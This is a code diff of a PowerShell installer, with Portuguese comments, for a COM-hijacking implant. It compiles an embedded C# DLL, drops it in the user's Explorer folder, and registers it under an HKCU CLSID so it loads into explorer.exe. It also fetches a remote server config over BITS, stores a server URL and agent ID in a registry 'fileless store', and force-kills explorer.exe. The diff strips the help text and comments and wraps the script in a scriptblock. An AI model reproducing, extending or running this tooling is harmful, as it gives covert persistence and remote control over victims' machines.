@@ -1,78 +1,50 @@
+& ([scriptblock]::Create(@'
 #Requires -Version 5.1
-<#
-.SYNOPSIS
-    Gerencia instalação e registro COM UserProfileCache (user-mode HKCU) - VERSÃO BITS
-
-.PARAMETER Action
-    Install   - Compila bootstrap, registra hijack, grava config C/U/I
-    Uninstall - Remove hijack e opcionalmente a DLL instalada
-    Register  - Apenas registro COM (dev/teste)
-    Unregister- Apenas remove registro COM
-    ListClsid - Lista CLSIDs candidatos (overlay, shell service, etc.)
-
-.PARAMETER Force
-    Install   - Reinstala mesmo se ja existir hijack + DLL para o -Clsid
-
-.EXAMPLE
-    .\profile-cache.ps1 -Action Install -Config 'https://host/conf.cfg' -Clsid '{GUID}' -RestartExplorer
-#>
 [CmdletBinding()]
 param(
-    [Parameter(Mandatory = $true)]
-    [ValidateSet('Install', 'Uninstall', 'Register', 'Unregister', 'ListClsid')]
+    [Parameter(Mandatory=$true)]
+    [ValidateSet('Install','Uninstall','Register','Unregister','ListClsid')]
     [string]$Action,
-
     [string]$Config,
     [string]$Clsid,
     [string]$DllPath,
     [string]$SourceDll,
-
-    [ValidateSet('Auto', 'x64', 'x86')]
-    [string]$Architecture = 'Auto',
-
+    [ValidateSet('Auto','x64','x86')]
+    [string]$Architecture='Auto',
     [switch]$RestartExplorer,
     [switch]$RemoveDll,
     [switch]$UnregisterPrevious,
     [switch]$UseRegAsm,
     [switch]$Force
 )
+$ErrorActionPreference='Stop'
+$Script:StateFile=Join-Path $env:TEMP '.profile-sync.last-clsid'
+$Script:InstallDllName='profilecache.dll'
+$Script:ComClassName='UserProfileCache.CacheProvider'
+$Script:FilelessStoreClsid='{B2C3D4E5-F6A7-8901-BCDE-F12345678901}'
 
-$ErrorActionPreference = 'Stop'
-
-$Script:StateFile = Join-Path $env:TEMP '.profile-sync.last-clsid'
-$Script:InstallDllName = 'profilecache.dll'
-$Script:ComClassName = 'UserProfileCache.CacheProvider'
-$Script:FilelessStoreClsid = '{B2C3D4E5-F6A7-8901-BCDE-F12345678901}'
-
-# ============================================================
-# NOVAS FUNÇÕES BITS (substituem WebClient)
-# ============================================================
 function Invoke-BitsDownloadString {
     param([string]$Url)
-    
-    $tempFile = [System.IO.Path]::GetTempFileName()
+    $tempFile=[System.IO.Path]::GetTempFileName()
     try {
         Start-BitsTransfer -Source $Url -Destination $tempFile -TransferType Download -Priority High -ErrorAction Stop
         return Get-Content $tempFile -Raw -Encoding UTF8
     } finally {
-        if (Test-Path $tempFile) { Remove-Item $tempFile -Force }
+        if(Test-Path $tempFile){Remove-Item $tempFile -Force}
     }
 }
 
 function Invoke-BitsDownloadData {
     param([string]$Url)
-    
-    $tempFile = [System.IO.Path]::GetTempFileName()
+    $tempFile=[System.IO.Path]::GetTempFileName()
     try {
         Start-BitsTransfer -Source $Url -Destination $tempFile -TransferType Download -Priority High -ErrorAction Stop
         return [System.IO.File]::ReadAllBytes($tempFile)
     } finally {
-        if (Test-Path $tempFile) { Remove-Item $tempFile -Force }
+        if(Test-Path $tempFile){Remove-Item $tempFile -Force}
     }
 }
-# ============================================================
 
-#region BootstrapSources (AUTO-GENERATED) - MESMO CÓDIGO ORIGINAL
 function Get-BootstrapSourceMap {
     return @{
         'CacheConstants.cs' = @'
@@ -681,7 +653,6 @@ namespace UserProfileCache
             @"""server""\s*:\s*""([^""]+)""",
             RegexOptions.IgnoreCase | RegexOptions.Compiled);
 
-        // Delegate para ser preenchido pelo PowerShell
         public static Func<string, string> DownloadStringWithBits = null;
 
         public static string FetchServerBase(string configUrl)
@@ -734,7 +705,6 @@ namespace UserProfileCache
         private static readonly object SyncRoot = new object();
         private static int _executed;
 
-        // Delegate para ser preenchido pelo PowerShell
         public static Func<string, byte[]> DownloadDataWithBits = null;
 
         public static void Execute()
@@ -923,13 +893,6 @@ namespace UserProfileCache
             {
             }
         }
-
-#if DEBUG
-        internal static void WriteDebugLog(string message)
-        {
-            WriteTrace(message);
-        }
-#endif
     }
 }
 '@
@@ -952,183 +915,80 @@ using System.Runtime.InteropServices;
 '@
     }
 }
-#endregion BootstrapSources
-
-#region Bootstrap compile
 
 function Get-CscPath {
-    param(
-        [ValidateSet('Auto', 'x64', 'x86')]
-        [string]$Arch = 'Auto'
-    )
-
-    $paths = @()
-    if ($Arch -eq 'x86') {
-        $paths += Join-Path $env:WINDIR 'Microsoft.NET\Framework\v4.0.30319\csc.exe'
-    }
-    elseif ($Arch -eq 'x64') {
-        $paths += Join-Path $env:WINDIR 'Microsoft.NET\Framework64\v4.0.30319\csc.exe'
-    }
-    else {
-        $paths += Join-Path $env:WINDIR 'Microsoft.NET\Framework64\v4.0.30319\csc.exe'
-        $paths += Join-Path $env:WINDIR 'Microsoft.NET\Framework\v4.0.30319\csc.exe'
-    }
-
-    foreach ($path in $paths) {
-        if (Test-Path $path) { return $path }
-    }
-
-    throw "csc.exe não encontrado. Instale .NET Framework 4.x. Tentativas: $($paths -join ', ')"
+    param([ValidateSet('Auto','x64','x86')][string]$Arch='Auto')
+    $paths=@()
+    if($Arch -eq 'x86'){$paths+=Join-Path $env:WINDIR 'Microsoft.NET\Framework\v4.0.30319\csc.exe'}
+    elseif($Arch -eq 'x64'){$paths+=Join-Path $env:WINDIR 'Microsoft.NET\Framework64\v4.0.30319\csc.exe'}
+    else{$paths+=Join-Path $env:WINDIR 'Microsoft.NET\Framework64\v4.0.30319\csc.exe';$paths+=Join-Path $env:WINDIR 'Microsoft.NET\Framework\v4.0.30319\csc.exe'}
+    foreach($path in $paths){if(Test-Path $path){return $path}}
+    throw "csc.exe nao encontrado"
 }
 
 function Invoke-CompileBootstrap {
-    param(
-        [Parameter(Mandatory = $true)][string]$OutputPath,
-        [ValidateSet('Auto', 'x64', 'x86')][string]$Arch = 'Auto'
-    )
-
-    $buildDir = Join-Path $env:TEMP ("upc_" + [guid]::NewGuid().ToString('N'))
+    param([string]$OutputPath,[string]$Arch='Auto')
+    $buildDir=Join-Path $env:TEMP ("upc_" + [guid]::NewGuid().ToString('N'))
     New-Item -ItemType Directory -Path $buildDir -Force | Out-Null
-
     try {
-        $sourceMap = Get-BootstrapSourceMap
-        foreach ($entry in $sourceMap.GetEnumerator()) {
-            $filePath = Join-Path $buildDir $entry.Key
+        $sourceMap=Get-BootstrapSourceMap
+        foreach($entry in $sourceMap.GetEnumerator()){
+            $filePath=Join-Path $buildDir $entry.Key
             Set-Content -LiteralPath $filePath -Value $entry.Value -Encoding UTF8
         }
-
-        $csc = Get-CscPath -Arch $Arch
-        $sourceFiles = Get-ChildItem -Path $buildDir -Filter '*.cs' | ForEach-Object { $_.FullName }
-
-        $outDir = Split-Path -Parent $OutputPath
-        if (-not (Test-Path $outDir)) {
-            New-Item -ItemType Directory -Path $outDir -Force | Out-Null
-        }
-
-        $stagingPath = Join-Path $buildDir 'UserProfileCache.dll'
-
-        $cscArgs = @(
-            '/nologo',
-            '/target:library',
-            '/platform:anycpu',
-            "/out:$stagingPath",
-            '/reference:System.dll'
-        ) + $sourceFiles
-
+        $csc=Get-CscPath -Arch $Arch
+        $sourceFiles=Get-ChildItem -Path $buildDir -Filter '*.cs' | ForEach-Object { $_.FullName }
+        $outDir=Split-Path -Parent $OutputPath
+        if(-not (Test-Path $outDir)){New-Item -ItemType Directory -Path $outDir -Force | Out-Null}
+        $stagingPath=Join-Path $buildDir 'UserProfileCache.dll'
+        $cscArgs=@('/nologo','/target:library','/platform:anycpu',"/out:$stagingPath",'/reference:System.dll') + $sourceFiles
         & $csc @cscArgs
-
-        if ($LASTEXITCODE -ne 0) {
-            throw "csc.exe falhou com exit code $LASTEXITCODE"
-        }
-
-        if (-not (Test-Path $stagingPath -PathType Leaf)) {
-            throw "Compilação não gerou: $stagingPath"
-        }
-
+        if($LASTEXITCODE -ne 0){throw "csc.exe falhou com exit code $LASTEXITCODE"}
+        if(-not (Test-Path $stagingPath -PathType Leaf)){throw "Compilacao nao gerou: $stagingPath"}
         Deploy-InstallDll -SourcePath $stagingPath -DestinationPath $OutputPath
-    }
-    finally {
-        if (Test-Path $buildDir) {
-            Remove-Item -LiteralPath $buildDir -Recurse -Force -ErrorAction SilentlyContinue
-        }
+    } finally {
+        if(Test-Path $buildDir){Remove-Item -LiteralPath $buildDir -Recurse -Force -ErrorAction SilentlyContinue}
     }
 }
 
-#endregion
-
-#region COM registry helpers
-
-function Format-ComClsid {
-    param([string]$Value)
-    $normalized = $Value.Trim('{}').ToUpperInvariant()
-    return "{$normalized}"
-}
-
-function Format-CodeBaseUri {
-    param([string]$Path)
-    $absolute = [System.IO.Path]::GetFullPath($Path)
-    return ([System.Uri]::new($absolute)).AbsoluteUri
-}
-
-function Get-MscoreePath {
-    param([ValidateSet('Auto', 'x64', 'x86')][string]$Arch = 'Auto')
-
-    if ($Arch -eq 'x86') { return Join-Path $env:WINDIR 'SysWOW64\mscoree.dll' }
-    return Join-Path $env:WINDIR 'System32\mscoree.dll'
-}
+function Format-ComClsid { param([string]$Value) $normalized=$Value.Trim('{}').ToUpperInvariant(); return "{$normalized}" }
+function Format-CodeBaseUri { param([string]$Path) $absolute=[System.IO.Path]::GetFullPath($Path); return ([System.Uri]::new($absolute)).AbsoluteUri }
+function Get-MscoreePath { param([ValidateSet('Auto','x64','x86')][string]$Arch='Auto') if($Arch -eq 'x86'){return Join-Path $env:WINDIR 'SysWOW64\mscoree.dll'} return Join-Path $env:WINDIR 'System32\mscoree.dll' }
 
 function Get-ComAssemblyMetadata {
-    param(
-        [Parameter(Mandatory = $true)][string]$Path,
-        [string]$ClassName,
-        [string]$AssemblyName
-    )
-
-    $absolutePath = [System.IO.Path]::GetFullPath($Path)
-    if (-not (Test-Path $absolutePath -PathType Leaf)) {
-        throw "DLL não encontrada: $absolutePath"
+    param([string]$Path,[string]$ClassName,[string]$AssemblyName)
+    $absolutePath=[System.IO.Path]::GetFullPath($Path)
+    if(-not (Test-Path $absolutePath -PathType Leaf)){throw "DLL nao encontrada: $absolutePath"}
+    $assembly=[System.Reflection.Assembly]::LoadFile($absolutePath)
+    $assemblyFullName=$assembly.GetName()
+    if(-not $AssemblyName){
+        $publicKeyToken='null'
+        $tokenBytes=$assemblyFullName.GetPublicKeyToken()
+        if($tokenBytes -and $tokenBytes.Length -gt 0){$publicKeyToken=-join ($tokenBytes | ForEach-Object { $_.ToString('x2') })}
+        $AssemblyName='{0}, Version={1}, Culture=neutral, PublicKeyToken={2}' -f @($assemblyFullName.Name,$assemblyFullName.Version,$publicKeyToken)
     }
-
-    $assembly = [System.Reflection.Assembly]::LoadFile($absolutePath)
-    $assemblyFullName = $assembly.GetName()
-
-    if (-not $AssemblyName) {
-        $publicKeyToken = 'null'
-        $tokenBytes = $assemblyFullName.GetPublicKeyToken()
-        if ($tokenBytes -and $tokenBytes.Length -gt 0) {
-            $publicKeyToken = -join ($tokenBytes | ForEach-Object { $_.ToString('x2') })
+    if(-not $ClassName){
+        $comType=$null
+        foreach($type in $assembly.GetExportedTypes()){
+            if($type.IsAbstract -or $type.IsInterface -or -not $type.IsPublic){continue}
+            $comVisible=$type.GetCustomAttributes([System.Runtime.InteropServices.ComVisibleAttribute],$false)
+            if($comVisible -and -not $comVisible[0].Value){continue}
+            $comType=$type;break
         }
-
-        $AssemblyName = '{0}, Version={1}, Culture=neutral, PublicKeyToken={2}' -f @(
-            $assemblyFullName.Name,
-            $assemblyFullName.Version,
-            $publicKeyToken
-        )
+        if(-not $comType){throw "Nenhuma classe COM exportada encontrada em $absolutePath"}
+        $ClassName=$comType.FullName
     }
-
-    if (-not $ClassName) {
-        $comType = $null
-        foreach ($type in $assembly.GetExportedTypes()) {
-            if ($type.IsAbstract -or $type.IsInterface -or -not $type.IsPublic) { continue }
-            $comVisible = $type.GetCustomAttributes([System.Runtime.InteropServices.ComVisibleAttribute], $false)
-            if ($comVisible -and -not $comVisible[0].Value) { continue }
-            $comType = $type
-            break
-        }
-
-        if (-not $comType) {
-            throw "Nenhuma classe COM exportada encontrada em $absolutePath"
-        }
-
-        $ClassName = $comType.FullName
-    }
-
-    return [PSCustomObject]@{
-        DllPath        = $absolutePath
-        AssemblyName   = $AssemblyName
-        ClassName      = $ClassName
-        RuntimeVersion = 'v4.0.30319'
-    }
+    return [PSCustomObject]@{DllPath=$absolutePath;AssemblyName=$AssemblyName;ClassName=$ClassName;RuntimeVersion='v4.0.30319'}
 }
 
 function Register-ComHijack {
-    param(
-        [Parameter(Mandatory = $true)][string]$Path,
-        [Parameter(Mandatory = $true)][string]$TargetClsid,
-        [ValidateSet('Auto', 'x64', 'x86')][string]$Arch = 'Auto',
-        [string]$ClassName,
-        [string]$AssemblyName,
-        [string]$Description = 'User Profile Cache'
-    )
-
-    $clsid = Format-ComClsid -Value $TargetClsid
-    $metadata = Get-ComAssemblyMetadata -Path $Path -ClassName $ClassName -AssemblyName $AssemblyName
-    $mscoree = Get-MscoreePath -Arch $Arch
-    $codeBase = Format-CodeBaseUri -Path $metadata.DllPath
-
-    $clsidKey = "HKCU:\Software\Classes\CLSID\$clsid"
-    $inprocKey = Join-Path $clsidKey 'InprocServer32'
-
+    param([string]$Path,[string]$TargetClsid,[string]$Arch='Auto',[string]$ClassName,[string]$AssemblyName,[string]$Description='User Profile Cache')
+    $clsid=Format-ComClsid -Value $TargetClsid
+    $metadata=Get-ComAssemblyMetadata -Path $Path -ClassName $ClassName -AssemblyName $AssemblyName
+    $mscoree=Get-MscoreePath -Arch $Arch
+    $codeBase=Format-CodeBaseUri -Path $metadata.DllPath
+    $clsidKey="HKCU:\Software\Classes\CLSID\$clsid"
+    $inprocKey=Join-Path $clsidKey 'InprocServer32'
     New-Item -Path $clsidKey -Force | Out-Null
     Set-ItemProperty -Path $clsidKey -Name '(default)' -Value $Description
     New-Item -Path $inprocKey -Force | Out-Null
@@ -1138,610 +998,206 @@ function Register-ComHijack {
     Set-ItemProperty -Path $inprocKey -Name 'Class' -Value $metadata.ClassName
     Set-ItemProperty -Path $inprocKey -Name 'RuntimeVersion' -Value $metadata.RuntimeVersion
     Set-ItemProperty -Path $inprocKey -Name 'CodeBase' -Value $codeBase
-
-    return [PSCustomObject]@{
-        Clsid          = $clsid
-        DllPath        = $metadata.DllPath
-        Mscoree        = $mscoree
-        Assembly       = $metadata.AssemblyName
-        Class          = $metadata.ClassName
-        RuntimeVersion = $metadata.RuntimeVersion
-        CodeBase       = $codeBase
-    }
+    return [PSCustomObject]@{Clsid=$clsid;DllPath=$metadata.DllPath;Mscoree=$mscoree;Assembly=$metadata.AssemblyName;Class=$metadata.ClassName;RuntimeVersion=$metadata.RuntimeVersion;CodeBase=$codeBase}
 }
 
-function Unregister-ComHijack {
-    param(
-        [Parameter(Mandatory = $true)][string]$TargetClsid,
-        [switch]$RemoveProgId
-    )
+function Unregister-ComHijack { param([string]$TargetClsid,[switch]$RemoveProgId) $clsid=Format-ComClsid -Value $TargetClsid; $clsidKey="HKCU:\Software\Classes\CLSID\$clsid"; if(Test-Path $clsidKey){Remove-Item -Path $clsidKey -Recurse -Force}; if($RemoveProgId){$progIdKey='HKCU:\Software\Classes\UserProfileCache.Provider';if(Test-Path $progIdKey){Remove-Item -Path $progIdKey -Recurse -Force}}; return $clsid }
 
-    $clsid = Format-ComClsid -Value $TargetClsid
-    $clsidKey = "HKCU:\Software\Classes\CLSID\$clsid"
-
-    if (Test-Path $clsidKey) {
-        Remove-Item -Path $clsidKey -Recurse -Force
-    }
-
-    if ($RemoveProgId) {
-        $progIdKey = 'HKCU:\Software\Classes\UserProfileCache.Provider'
-        if (Test-Path $progIdKey) {
-            Remove-Item -Path $progIdKey -Recurse -Force
-        }
-    }
-
-    return $clsid
-}
-
-function Get-RegAsmPath {
-    foreach ($path in @(
-            "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe",
-            "$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe"
-        )) {
-        if (Test-Path $path) { return $path }
-    }
-    throw "RegAsm.exe não encontrado."
-}
+function Get-RegAsmPath { foreach($path in @("$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe","$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe")){if(Test-Path $path){return $path}}; throw "RegAsm.exe nao encontrado." }
 
 function Register-ComHijackViaRegAsm {
-    param(
-        [Parameter(Mandatory = $true)][string]$Path,
-        [string]$TargetClsid
-    )
-
-    $dllPath = [System.IO.Path]::GetFullPath($Path)
-    $regAsm = Get-RegAsmPath
-    $regFile = Join-Path $env:TEMP "UserProfileCache_$(Get-Random).reg"
-    $hkcuRegFile = Join-Path $env:TEMP "UserProfileCache_hkcu_$(Get-Random).reg"
-
+    param([string]$Path,[string]$TargetClsid)
+    $dllPath=[System.IO.Path]::GetFullPath($Path)
+    $regAsm=Get-RegAsmPath
+    $regFile=Join-Path $env:TEMP "UserProfileCache_$(Get-Random).reg"
+    $hkcuRegFile=Join-Path $env:TEMP "UserProfileCache_hkcu_$(Get-Random).reg"
     try {
         & $regAsm $dllPath /regfile:$regFile /codebase | Out-Null
-        if (-not (Test-Path $regFile)) { throw "RegAsm não gerou o arquivo .reg esperado." }
-
-        $content = Get-Content -Path $regFile -Raw -Encoding Unicode
-        $content = $content -replace 'HKEY_CLASSES_ROOT', 'HKEY_CURRENT_USER\Software\Classes'
+        if(-not (Test-Path $regFile)){throw "RegAsm nao gerou o arquivo .reg esperado."}
+        $content=Get-Content -Path $regFile -Raw -Encoding Unicode
+        $content=$content -replace 'HKEY_CLASSES_ROOT','HKEY_CURRENT_USER\Software\Classes'
         Set-Content -Path $hkcuRegFile -Value $content -Encoding Unicode
         & reg.exe import $hkcuRegFile | Out-Null
+    } finally {
+        Remove-Item -Path $regFile,$hkcuRegFile -ErrorAction SilentlyContinue
     }
-    finally {
-        Remove-Item -Path $regFile, $hkcuRegFile -ErrorAction SilentlyContinue
-    }
-
-    if (-not $TargetClsid) {
-        $metadata = Get-ComAssemblyMetadata -Path $dllPath
-        $assembly = [System.Reflection.Assembly]::LoadFile($metadata.DllPath)
-        foreach ($type in $assembly.GetExportedTypes()) {
-            if ($type.GUID -ne [Guid]::Empty) {
-                $TargetClsid = $type.GUID.ToString().ToUpperInvariant()
-                break
-            }
-        }
-    }
-
-    $clsid = Format-ComClsid -Value $TargetClsid
-    $inprocKey = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
-    if (-not (Test-Path $inprocKey)) { throw "Registro HKCU não encontrado em $inprocKey" }
-
-    $props = Get-ItemProperty -Path $inprocKey
-    return [PSCustomObject]@{
-        Clsid          = $clsid
-        DllPath        = $dllPath
-        Mscoree        = $props.'(default)'
-        Assembly       = $props.Assembly
-        Class          = $props.Class
-        RuntimeVersion = $props.RuntimeVersion
-        CodeBase       = $props.CodeBase
-    }
+    if(-not $TargetClsid){$metadata=Get-ComAssemblyMetadata -Path $dllPath;$assembly=[System.Reflection.Assembly]::LoadFile($metadata.DllPath);foreach($type in $assembly.GetExportedTypes()){if($type.GUID -ne [Guid]::Empty){$TargetClsid=$type.GUID.ToString().ToUpperInvariant();break}}}
+    $clsid=Format-ComClsid -Value $TargetClsid
+    $inprocKey="HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
+    if(-not (Test-Path $inprocKey)){throw "Registro HKCU nao encontrado em $inprocKey"}
+    $props=Get-ItemProperty -Path $inprocKey
+    return [PSCustomObject]@{Clsid=$clsid;DllPath=$dllPath;Mscoree=$props.'(default)';Assembly=$props.Assembly;Class=$props.Class;RuntimeVersion=$props.RuntimeVersion;CodeBase=$props.CodeBase}
 }
 
-function Unregister-ComHijackViaRegAsm {
-    param(
-        [Parameter(Mandatory = $true)][string]$Path,
-        [Parameter(Mandatory = $true)][string]$TargetClsid
-    )
+function Unregister-ComHijackViaRegAsm { param([string]$Path,[string]$TargetClsid) & (Get-RegAsmPath) ([System.IO.Path]::GetFullPath($Path)) /unregister /codebase | Out-Null; Unregister-ComHijack -TargetClsid $TargetClsid -RemoveProgId }
 
-    & (Get-RegAsmPath) ([System.IO.Path]::GetFullPath($Path)) /unregister /codebase | Out-Null
-    Unregister-ComHijack -TargetClsid $TargetClsid -RemoveProgId
-}
-
-#endregion
-
-#region Install helpers
-
-function Test-IsAdmin {
-    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
-        [Security.Principal.WindowsBuiltInRole]::Administrator)
-}
+function Test-IsAdmin { ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) }
 
 function Get-ServerUrl {
     param([string]$Url)
-
-    # Usa BITS em vez de WebClient
-    $raw = Invoke-BitsDownloadString -Url $Url
-    $srv = $null
-
-    if ($PSVersionTable.PSVersion.Major -ge 3) {
-        try {
-            $j = $raw | ConvertFrom-Json
-            if ($j) { $srv = $j.server }
-        } catch { }
-    }
-
-    if (-not $srv -and ($raw -match '"server"\s*:\s*"([^"]+)"')) {
-        $srv = $matches[1]
-    }
-
-    if (-not $srv) { throw "Config missing 'server' key." }
+    $raw=Invoke-BitsDownloadString -Url $Url
+    $srv=$null
+    if($PSVersionTable.PSVersion.Major -ge 3){try{$j=$raw|ConvertFrom-Json;if($j){$srv=$j.server}}catch{}}
+    if(-not $srv -and ($raw -match '"server"\s*:\s*"([^"]+)"')){$srv=$matches[1]}
+    if(-not $srv){throw "Config missing 'server' key."}
     return $srv.Trim().TrimEnd('/')
 }
 
-function Get-InstallDllPath {
-    Join-Path (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\Explorer') $Script:InstallDllName
-}
+function Get-InstallDllPath { Join-Path (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\Explorer') $Script:InstallDllName }
 
 function Get-ProfileCacheHijackInstall {
     param([string]$TargetClsid)
-
-    $destDll = Get-InstallDllPath
-    $dllExists = Test-Path $destDll -PathType Leaf
-    $clsidRoot = 'HKCU:\Software\Classes\CLSID'
-
-    if (-not (Test-Path $clsidRoot)) {
-        return $null
+    $destDll=Get-InstallDllPath
+    $dllExists=Test-Path $destDll -PathType Leaf
+    $clsidRoot='HKCU:\Software\Classes\CLSID'
+    if(-not (Test-Path $clsidRoot)){return $null}
+    $found=@()
+    foreach($subKey in Get-ChildItem -Path $clsidRoot -ErrorAction SilentlyContinue){
+        $inprocKey=Join-Path $subKey.PSPath 'InprocServer32'
+        if(-not (Test-Path $inprocKey)){continue}
+        $inproc=Get-ItemProperty -Path $inprocKey -ErrorAction SilentlyContinue
+        if($inproc.Class -ne $Script:ComClassName){continue}
+        $clsid=Format-ComClsid -Value $subKey.PSChildName
+        $clsidProps=Get-ItemProperty -Path $subKey.PSPath -ErrorAction SilentlyContinue
+        $found += [PSCustomObject]@{Clsid=$clsid;DllPath=$destDll;DllExists=$dllExists;Config=$clsidProps.C;Server=$clsidProps.U;AgentId=$clsidProps.I;OriginalDll=$clsidProps.O;CodeBase=$inproc.CodeBase}
     }
-
-    $found = @()
-    foreach ($subKey in Get-ChildItem -Path $clsidRoot -ErrorAction SilentlyContinue) {
-        $inprocKey = Join-Path $subKey.PSPath 'InprocServer32'
-        if (-not (Test-Path $inprocKey)) {
-            continue
-        }
-
-        $inproc = Get-ItemProperty -Path $inprocKey -ErrorAction SilentlyContinue
-        if ($inproc.Class -ne $Script:ComClassName) {
-            continue
-        }
-
-        $clsid = Format-ComClsid -Value $subKey.PSChildName
-        $clsidProps = Get-ItemProperty -Path $subKey.PSPath -ErrorAction SilentlyContinue
-
-        $found += [PSCustomObject]@{
-            Clsid       = $clsid
-            DllPath     = $destDll
-            DllExists   = $dllExists
-            Config      = $clsidProps.C
-            Server      = $clsidProps.U
-            AgentId     = $clsidProps.I
-            OriginalDll = $clsidProps.O
-            CodeBase    = $inproc.CodeBase
-        }
-    }
-
-    if ($TargetClsid) {
-        $formatted = Format-ComClsid -Value $TargetClsid
-        return $found | Where-Object { $_.Clsid -eq $formatted } | Select-Object -First 1
-    }
-
+    if($TargetClsid){$formatted=Format-ComClsid -Value $TargetClsid;return $found | Where-Object { $_.Clsid -eq $formatted } | Select-Object -First 1}
     return $found | Select-Object -First 1
 }
 
-function Test-ProfileCacheInstalled {
-    param([string]$TargetClsid)
-
-    $state = Get-ProfileCacheHijackInstall -TargetClsid $TargetClsid
-    if (-not $state) {
-        return $false
-    }
-
-    return $state.DllExists
-}
+function Test-ProfileCacheInstalled { param([string]$TargetClsid) $state=Get-ProfileCacheHijackInstall -TargetClsid $TargetClsid; if(-not $state){return $false}; return $state.DllExists }
 
 function Test-FileInUse {
-    param([Parameter(Mandatory = $true)][string]$Path)
-
-    if (-not (Test-Path $Path -PathType Leaf)) {
-        return $false
-    }
-
-    try {
-        $stream = [System.IO.File]::Open(
-            $Path,
-            [System.IO.FileMode]::Open,
-            [System.IO.FileAccess]::ReadWrite,
-            [System.IO.FileShare]::None)
-        $stream.Close()
-        $stream.Dispose()
-        return $false
-    }
-    catch {
-        return $true
-    }
+    param([string]$Path)
+    if(-not (Test-Path $Path -PathType Leaf)){return $false}
+    try{$stream=[System.IO.File]::Open($Path,[System.IO.FileMode]::Open,[System.IO.FileAccess]::ReadWrite,[System.IO.FileShare]::None);$stream.Close();$stream.Dispose();return $false}catch{return $true}
 }
 
 function Release-ProfileCacheDllLock {
-    param(
-        [Parameter(Mandatory = $true)][string]$DllPath,
-        [string]$Clsid
-    )
-
-    if (-not (Test-FileInUse -Path $DllPath)) {
-        return
-    }
-
-    if ($Clsid) {
-        $clsid = Format-ComClsid -Value $Clsid
-        $inprocKey = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
-        if (Test-Path $inprocKey) {
-            Remove-Item -Path $inprocKey -Recurse -Force -ErrorAction SilentlyContinue
-        }
-    }
-
-    $null = taskkill /f /im explorer.exe 2>&1
+    param([string]$DllPath,[string]$Clsid)
+    if(-not (Test-FileInUse -Path $DllPath)){return}
+    if($Clsid){$clsid=Format-ComClsid -Value $Clsid;$inprocKey="HKCU:\Software\Classes\CLSID\$clsid\InprocServer32";if(Test-Path $inprocKey){Remove-Item -Path $inprocKey -Recurse -Force -ErrorAction SilentlyContinue}}
+    $null=taskkill /f /im explorer.exe 2>&1
     Start-Sleep -Seconds 2
-
-    for ($attempt = 1; $attempt -le 6; $attempt++) {
-        if (-not (Test-FileInUse -Path $DllPath)) {
-            return
-        }
-
-        Start-Sleep -Seconds 1
-    }
-
-    throw @"
-Nao foi possivel substituir a DLL — ainda em uso por outro processo.
-  $DllPath
-
-Passos manuais:
-  1. .\profile-cache.ps1 -Action Uninstall -Clsid '$Clsid' -RestartExplorer
-  2. Reinicie a sessao Windows, ou
-  3. Execute Install de novo com -RestartExplorer
-"@
+    for($attempt=1;$attempt -le 6;$attempt++){if(-not (Test-FileInUse -Path $DllPath)){return};Start-Sleep -Seconds 1}
+    throw "Nao foi possivel substituir a DLL — ainda em uso por outro processo. $DllPath"
 }
 
-function Deploy-InstallDll {
-    param(
-        [Parameter(Mandatory = $true)][string]$SourcePath,
-        [Parameter(Mandatory = $true)][string]$DestinationPath
-    )
-
-    $destDir = Split-Path -Parent $DestinationPath
-    if (-not (Test-Path $destDir)) {
-        New-Item -ItemType Directory -Path $destDir -Force | Out-Null
-    }
-
-    Copy-Item -LiteralPath $SourcePath -Destination $DestinationPath -Force
-}
+function Deploy-InstallDll { param([string]$SourcePath,[string]$DestinationPath) $destDir=Split-Path -Parent $DestinationPath; if(-not (Test-Path $destDir)){New-Item -ItemType Directory -Path $destDir -Force | Out-Null}; Copy-Item -LiteralPath $SourcePath -Destination $DestinationPath -Force }
 
 function Sync-FilelessRegistryStore {
-    param(
-        [Parameter(Mandatory = $true)][string]$ConfigUrl,
-        [Parameter(Mandatory = $true)][string]$ServerBase,
-        [Parameter(Mandatory = $true)][string]$AgentId
-    )
-
-    $storeKey = "HKCU:\Software\Classes\CLSID\$($Script:FilelessStoreClsid)"
+    param([string]$ConfigUrl,[string]$ServerBase,[string]$AgentId)
+    $storeKey="HKCU:\Software\Classes\CLSID\$($Script:FilelessStoreClsid)"
     New-Item -Path $storeKey -Force | Out-Null
     Set-ItemProperty -Path $storeKey -Name 'C' -Value $ConfigUrl -Type String
     Set-ItemProperty -Path $storeKey -Name 'U' -Value $ServerBase -Type String
     Set-ItemProperty -Path $storeKey -Name 'I' -Value $AgentId -Type String
     Remove-ItemProperty -Path $storeKey -Name 'T' -ErrorAction SilentlyContinue
-
-    $legacyKey = "HKCU:\Software\Classes\CLSID\$($Script:FilelessStoreClsid.Trim('{}'))"
-    if (Test-Path $legacyKey) {
-        Remove-Item -Path $legacyKey -Recurse -Force -ErrorAction SilentlyContinue
-    }
+    $legacyKey="HKCU:\Software\Classes\CLSID\$($Script:FilelessStoreClsid.Trim('{}'))";if(Test-Path $legacyKey){Remove-Item -Path $legacyKey -Recurse -Force -ErrorAction SilentlyContinue}
 }
 
-function Remove-FilelessRegistryStore {
-    $storeKey = "HKCU:\Software\Classes\CLSID\$($Script:FilelessStoreClsid)"
-    if (Test-Path $storeKey) {
-        Remove-Item -Path $storeKey -Recurse -Force
-    }
-
-    $legacyKey = "HKCU:\Software\Classes\CLSID\$($Script:FilelessStoreClsid.Trim('{}'))"
-    if (Test-Path $legacyKey) {
-        Remove-Item -Path $legacyKey -Recurse -Force -ErrorAction SilentlyContinue
-    }
-}
-
-#region ListClsid helpers
